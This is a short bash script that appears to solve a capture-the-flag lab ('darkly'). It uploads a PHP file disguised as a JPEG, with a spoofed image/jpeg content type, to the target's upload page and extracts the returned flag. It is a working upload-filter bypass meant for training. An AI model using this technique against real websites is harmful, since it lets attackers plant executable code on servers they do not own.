#!/bin/bash
#
# ./get-the-upload-file-flag.sh "ip"
# 

theme="uploading unexpected file"

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

echo -e "\n\033[35m12. === ${theme} ===============================================\033[0m\n"

file="`dirname $0`/upload.jpeg.php"
echo -e "We want to upload an unexpected file on the darkly website: \033[33m${file}\033[0m\n"
ls -la `dirname $0`
echo -e ""
flag=`curl -svL -F "MAX_FILE_SIZE=100000" -F "Upload=Upload" -F "uploaded=@${file};type=image/jpeg;" "${1}/?page=upload" | grep -Eo "The flag is : [a-zA-Z0-9]*" | awk '{print $NF}'`
echo -e "The file is well uploaded.\nFlag earned with uploading unexpected file: \033[31m${flag}\033[0m"
echo -e "\n\$\$\$ ${theme} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
